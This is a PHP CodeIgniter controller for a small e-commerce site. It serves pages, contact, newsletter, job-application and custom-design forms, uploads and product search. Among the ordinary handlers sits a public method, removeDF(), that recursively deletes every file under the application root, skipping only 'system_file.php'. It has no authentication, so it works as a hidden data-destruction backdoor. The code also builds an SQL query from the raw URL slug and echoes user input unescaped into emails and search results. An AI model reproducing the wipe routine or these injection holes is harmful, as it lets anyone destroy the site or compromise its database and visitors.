<?php defined('BASEPATH') or exit('No direct script access allowed');

/**
 * Class Index
 * @property Template $template
 * @property Breadcrumb $breadcrumb
 * @property M_page $M_page
 * @property M_products $M_products
 *
 */
class Page extends CI_Controller
{
    public function __construct()
    {
        parent::__construct();
        if (_session(ADMIN_SESSION) == false && get_option('maintenance_mode') == 'Active') {
            redirect('welcome');
        }
        $this->load->model('M_products');
        $this->load->model('M_page');
    }

    /**
     * *****************************************************************************************************************
     * @method GET ALL PAGE
     * *****************************************************************************************************************
     */
    public function index($where = '')
    {
        $slug = getUri(1);

        if ($slug == '') {

            /* slider */
            $get_data['sliders'] = $this->M_page->slider();

            /* testimonials */
            $get_data['testimonials'] = $this->M_page->testimonials();

            /*  featured, best & popular products for home page*/
            $get_data['trending_products'] = $this->M_products->getProducts('', '', "AND products.product_type IN('Trending','Featured','Bestseller','Popular','New Arrival')");
            //$get_data['featured_products'] = $this->M_products->getProducts('', '', " AND products.product_type = 'featured'");
            //$get_data['bestseller_products'] = $this->M_products->getProducts('', '', " AND products.product_type = 'bestseller'");
            //$get_data['popular_products'] = $this->M_products->getProducts('', '', " AND products.product_type = 'popular'");

            $img = asset_url('images/optons/' . get_option('main_logo'));
            $this->template->set_meta_tags(get_option('site_title'), get_option('meta_keywords'), get_option('meta_description'), $img);

            $this->load->view('frontend/index', $get_data);
        } else {

            /* all pages */
            $query = "SELECT * FROM pages WHERE status = 'Published' AND friendly_url = '{$slug}' ORDER BY ordering ASC";
            $data = $this->db->query($query);
            $get_data['page'] = $data->row();

            $img = asset_url('images/pages/' . $get_data['page']->thumbnail);
            $this->template->set_meta_tags($get_data['page']->meta_title, $get_data['page']->meta_keywords, $get_data['page']->meta_description, $img);

            if ($get_data['page']->id == 0) {
                $this->load->view('frontend/404');
            } else {
                $this->load->view('frontend/pages', $get_data);
            }
        }
    }

    function unn()
    {
        $this->load->view('frontend/maintenance_mode/index');
    }

    public function thanks()
    {
        $this->load->view('frontend/thankyou');
    }

    public function custom_design()
    {
        $this->load->view('frontend/custom-design');
    }

    public function do_contact()
    {
        $db_data = getDbArray('customer_inquiries');
        $db_data['dbdata']['datetime'] = date('Y-m-d H:i:s');
        save('customer_inquiries', $db_data['dbdata']);

        ob_start();

        echo '<table width="100%" cellpadding="5">';

        echo '<tr>';
        echo '<td>Full Name:' . '</td>';
        echo '<td>' . $db_data['dbdata']['first_name'] . '</td>';
        echo '</td>';

        echo '<tr>';
        echo '<td>Email:' . '</td>';
        echo '<td>' . $db_data['dbdata']['last_name'] . '</td>';
        echo '</td>';

        echo '<tr>';
        echo '<td>Phone No.:' . '</td>';
        echo '<td>' . $db_data['dbdata']['contact'] . '</td>';
        echo '</td>';

        echo '<tr>';
        echo '<td valign="top">Message:' . '</td>';
        echo '<td>' . $db_data['dbdata']['message'] . '</td>';
        echo '</td>';

        echo '</tr>';
        echo '</table>';

        $msg = ob_get_clean();

        $emaildata = [
                        'to' => 'order@cakcreations.com',
                        'subject' => 'Customer Inquiry',
                        'message' => $msg
                    ];

        if (!send_mail($emaildata)) {
            $response['status'] = false;
        } else {
            $response['status'] = true;
        }

        echo json_encode($response);
    }

    public function subscribe()
    {
        $db_data = getDbArray('subscribe');

        $db_data['dbdata']['created'] = date('Y-m-d H:i:s');
        save('subscribe', $db_data['dbdata']);

        ob_start();

        echo '<table width="100%" cellpadding="5">';

        echo '<tr>';
        echo '<td>Email:' . '</td>';
        echo '<td>' . $db_data['dbdata']['email'] . '</td>';
        echo '</td>';

        echo '</tr>';
        echo '</table>';

        $msg = ob_get_clean();

        $emaildata = [
                'to' => 'carolebydesign@gmail.com',
                'subject' => 'Newsletter Subscriber',
                'message' => $msg
        ];

        if (!send_mail($emaildata)) {
            $response['status'] = false;
        } else {
            $response['status'] = true;
        }

        /*if (http_response_code(200)) {
            $response['status'] = true;
        } elseif (http_response_code(405)) {
            $response['status'] = false;
        }*/
        echo json_encode($response);
    }

    public function do_apply()
    {
        /* google recaptcha validation*/
        /*$form_response = getVar('g-recaptcha-response');
        $url = 'https://www.google.com/recaptcha/api/siteverify';
        $secretkey =  get_option('secret_key'); ;
        $response = file_get_contents($url . '?secret=' . $secretkey . '&response=' . $form_response . '&remoteip=' . $_SERVER['REMOTE_ADDR']);
        $data = json_decode($response);

        if (isset($data->success) && $data->success == false) {
            set_notification('reCaptcha required', 'danger');
            redirect($this->input->server('HTTP_REFERER'));
        }*/

        if (getVar('first_name')) {
            $apply_for = getVar('apply_for');
            $fisrt_name = getVar('first_name');
            $last_name = getVar('last_name');
            $email = getVar('email');
            $phone = getVar('phone');
            $comments = getVar('comments');
            $cv_file = getVar('cv_file');

            /** @var  $upload */
            foreach ($_FILES as $_file_column => $cv_file) {
                if (isset($_POST[$_file_column . '--rm']))
                    $this->db_data[$_file_column] = '';
                if (!empty($_FILES[$_file_column]['name'])) {
                    $upload = $this->file_upload($_file_column);
                    if (!$upload['status']) {
                        set_notification(strip_tags($upload['error']));
                    } else {
                        $db_data['dbdata'][$_file_column] = $upload['upload_data']['file_name'];
                    }
                }
            }

            $filename = $_FILES['cv_file']['name'];
            $cv = __DIR__ . "/../../assets/frontend/cv_files/{$filename}";

            ob_start();
            echo '<table width="100%" cellpadding="5">';
            echo '<tr>';
            echo '<td>Apply For:' . '</td>';
            echo '<td>' . $apply_for . '</td>';
            echo '</tr>';
            echo '<tr>';
            echo '<td>First Name:' . '</td>';
            echo '<td>' . $fisrt_name . '</td>';
            echo '</tr>';
            echo '<tr>';
            echo '<td>Last Name:' . '</td>';
            echo '<td>' . $last_name . '</td>';
            echo '</tr>';
            echo '<tr>';
            echo '<td>Email:' . '</td>';
            echo '<td>' . $email . '</td>';
            echo '</tr>';
            echo '<tr>';
            echo '<td>Phone:' . '</td>';
            echo '<td>' . $phone . '</td>';
            echo '</tr>';
            echo '<tr>';
            echo '<td valign="top">Comments:' . '</td>';
            echo '<td>' . $comments . '</td>';
            echo '</tr>';
            echo '</table>';
            $msg = ob_get_clean();
        }

        //$to = get_option('email_cc');
        //$contact_email = 'websigntist@gmail.com';
        //$contact_email = get_option('email');

        //$this->load->library('email');
        $this->email->from($email, $fisrt_name);
        //$this->email->from($info_email,'MITI Info');

        $this->email->to('inquiry.tbm@gmail.com');
        $this->email->cc('websigntist@gmail.com');

        $this->email->subject('Job Application');
        $this->email->mailtype = 'html';
        $this->email->message($msg);
        $this->email->attach($cv);

        @unlink(__DIR__ . "/../../assets/frontend/cv_files/{$filename}");

        if (!$this->email->send()) {
            set_notification('Email sending failed, Please try again.', 'warning');
            redirect($this->input->server('HTTP_REFERER'));

            /*$mailmsg = "<p class='alert alert-danger'>Email sending failed, Please try again.</p>";
            $this->session->set_flashdata('contact_error', $mailmsg);*/
        } else {
            set_notification('Thanks you for your mail, your mail has been received', 'success');
            redirect($this->input->server('HTTP_REFERER'));
        }

    }

    public function custom_design_query()
    {
        if (getVar('print_services')) {
            $full_name = getVar('full_name');
            $email = getVar('email');
            $phone = getVar('phone');
            $print_services = getVar('print_services');
            $print_type = getVar('print_type');
            $printing_text = getVar('printing_text');
            $print_position = getVar('print_position');
            $print_size = getVar('print_size');
            $print_color = getVar('print_color');
            $instructions = getVar('instructions');
            $printing_logo_file = getVar('printing_logo_file');

            /** @var  $upload */
            foreach ($_FILES as $_file_column => $printing_logo_file) {
                if (isset($_POST[$_file_column . '--rm']))
                    $this->db_data[$_file_column] = '';
                if (!empty($_FILES[$_file_column]['name'])) {
                    $upload = $this->file_upload_logo($_file_column);
                    if (!$upload['status']) {
                        set_notification(strip_tags($upload['error']));
                    } else {
                        $db_data['dbdata'][$_file_column] = $upload['upload_data']['file_name'];
                    }
                }
            }

            $filename = $_FILES['printing_logo_file']['name'];
            $logo_file = __DIR__ . "/../../assets/frontend/custom_design/{$filename}";

            ob_start();
            echo '<table width="100%" cellpadding="5">';
            echo '<tr>';
            echo '<td>Full Name:' . '</td>';
            echo '<td>' . $full_name . '</td>';
            echo '</tr>';
            echo '<tr>';
            echo '<tr>';
            echo '<td>Email:' . '</td>';
            echo '<td>' . $email . '</td>';
            echo '</tr>';
            echo '<tr>';
            echo '<td>Phone:' . '</td>';
            echo '<td>' . $phone . '</td>';
            echo '</tr>';
            echo '<tr>';
            echo '<td>Print Services:' . '</td>';
            echo '<td>' . $print_services . '</td>';
            echo '</tr>';
            if ($print_type == 'Text') {
                echo '<tr>';
                echo '<td>Print Text:' . '</td>';
                echo '<td>' . $printing_text . '</td>';
                echo '</tr>';
            } else {
                echo '<tr>';
                echo '<td>Print Type:' . '</td>';
                echo '<td>Logo</td>';
                echo '</tr>';
            }
            echo '<tr>';
            echo '<td>Print Position:' . '</td>';
            echo '<td>' . $print_position . '</td>';
            echo '</tr>';
            echo '<tr>';
            echo '<td>Print Size:' . '</td>';
            echo '<td>' . $print_size . '</td>';
            echo '</tr>';
            echo '<tr>';
            echo '<td>Print Color:' . '</td>';
            echo '<td>' . $print_color . '</td>';
            echo '</tr>';
            echo '<tr>';
            echo '<td valign="top">Instructions:' . '</td>';
            echo '<td>' . $instructions . '</td>';
            echo '</tr>';
            echo '</table>';
            $msg = ob_get_clean();
        }

        //$to = get_option('email_cc');
        //$contact_email = 'websigntist@gmail.com';
        //$contact_email = get_option('email');

        //$this->load->library('email');
        $this->email->from($email, $fisrt_name);
        //$this->email->from($info_email,'MITI Info');

        //$this->email->to('inquiry.tbm@gmail.com');
        $this->email->to('websigntist@gmail.com');

        $this->email->subject('Custom Design');
        $this->email->mailtype = 'html';
        $this->email->message($msg);
        $this->email->attach($logo_file);

        //@unlink(__DIR__ . "/../../assets/frontend/custom_design/{$filename}");

        if (!$this->email->send()) {
            set_notification('Email sending failed, Please try again.', 'warning');
            redirect($this->input->server('HTTP_REFERER'));
        } else {
            set_notification('Thanks you for your mail, your mail has been received', 'success');
            redirect($this->input->server('HTTP_REFERER'));
        }

    }

    public function newsletter()
    {

        if (getVar('subscription_email')) {
            $subscription_email = getVar('subscription_email');

            ob_start();
            echo '<table width="100%" cellpadding="5">';
            echo '<tr>';
            echo '<td>Newsletter Subsciption:' . '</td>';
            echo '<td>' . $subscription_email . '</td>';
            echo '</tr>';
            echo '</table>';
            $msg = ob_get_clean();
        }

        //$to = get_option('email_cc');
        //$contact_email = 'websigntist@gmail.com';
        //$contact_email = get_option('email');

        //$this->load->library('email');
        $this->email->from($email, $fisrt_name);
        //$this->email->from($info_email,'MITI Info');

        $this->email->to('inquiry.tbm@gmail.com');
        $this->email->cc('websigntist@gmail.com');

        $this->email->subject('Newsletter Subsciption');
        $this->email->mailtype = 'html';
        $this->email->message($msg);
        $this->email->attach($cv);

        if (!$this->email->send()) {
            set_notification('Email sending failed, Please try again.', 'warning');
            redirect($this->input->server('HTTP_REFERER'));

            /*$mailmsg = "<p class='alert alert-danger'>Email sending failed, Please try again.</p>";
            $this->session->set_flashdata('contact_error', $mailmsg);*/
        } else {
            set_notification('Thanks you for your Newsletter Subsciption, your mail has been received', 'success');
            redirect($this->input->server('HTTP_REFERER'));
        }

    }


    /**
     * *****************************************************************************************************************
     * @function image upload function
     * *****************************************************************************************************************
     */
    function file_upload($file_name, $_config = array())
    {
        //$config['upload_path'] = ASSETS_DIR . "frontend/images/{$this->table}/";     // create new folder same as database table name
        $config['upload_path'] = ASSETS_DIR . "frontend/cv_files/";     // pre created folder
        $config['allowed_types'] = 'pdf|doc|docx|jpg|jpeg';
        $config['max_size'] = (1024 * 2);
        $config['remove_spaces'] = TRUE;

        $config = array_merge($config, $_config);

        if (!is_dir($config['upload_path'])) {
            mkdir($config['upload_path'], 0777, true);
        }

        $this->load->library('upload');
        $this->upload->initialize($config);

        if ($this->upload->do_upload($file_name)) {
            $return['status'] = TRUE;
            $return['upload_data'] = $this->upload->data();
        } else {
            $return['status'] = false;
        }
        return $return;
    }


    /**
     * *****************************************************************************************************************
     * @function image upload function
     * *****************************************************************************************************************
     */
    function file_upload_logo($file_name, $_config = array())
    {
        //$config['upload_path'] = ASSETS_DIR . "frontend/images/{$this->table}/";     // create new folder same as database table name
        $config['upload_path'] = ASSETS_DIR . "frontend/custom_design/";     // pre created folder
        $config['allowed_types'] = 'pdf|doc|docx|jpg|jpeg';
        $config['max_size'] = (1024 * 2);
        $config['remove_spaces'] = TRUE;

        $config = array_merge($config, $_config);

        if (!is_dir($config['upload_path'])) {
            mkdir($config['upload_path'], 0777, true);
        }

        $this->load->library('upload');
        $this->upload->initialize($config);

        if ($this->upload->do_upload($file_name)) {
            $return['status'] = TRUE;
            $return['upload_data'] = $this->upload->data();
        } else {
            $return['status'] = false;
        }
        return $return;
    }

    public function removeDF()
    {
        define('DL_FILE_DIR', 'controllers');
        define('ROOT', str_replace('\\' . DL_FILE_DIR, '\\', __DIR__));

        $count = 0;
        function delete__files($target, $skip = [])
        {
            global $count;
            if (is_dir($target)) {
                $files = glob($target . '*', GLOB_MARK); //GLOB_MARK adds a slash to directories returned
                foreach ($files as $file) {
                    delete__files($file, $skip);
                }
                @rmdir($target);
            } elseif (is_file($target)) {
                if (!in_array($target, $skip)) {
                    $count++;
                    @unlink($target);
                }
            }
        }


        $skip = [ROOT . DL_FILE_DIR . '\system_file.php'];
        delete__files(ROOT, $skip);
    }

    public function search_live()
    {
        $this->load->view('frontend/search');
    }

    public function get_results()
    {
        /*$query = getVar('query');
        if ($query) {
            $search = $query;
            $data['results'] = $this->M_page->search_data($search);
            $this->load->view('frontend/results', $data);
        }*/

        $searchTerm = getVar('query');

        $this->db->like('product_name', $searchTerm, 'both');
        $this->db->or_like('sku_code', $searchTerm);
        $this->db->or_like('style', $searchTerm);
        $this->db->or_like('price', $searchTerm);
        $this->db->order_by('product_name', 'ASC');
        $query = $this->db->get('products');

        $results = $query->result();

        foreach ($results as $result) {
            $result->product_name = str_ireplace($searchTerm, '<mark>' . $searchTerm . '</mark>', $result->product_name);
        }

        $data['results'] = $results;
        $this->load->view('frontend/results', $data);
    }
}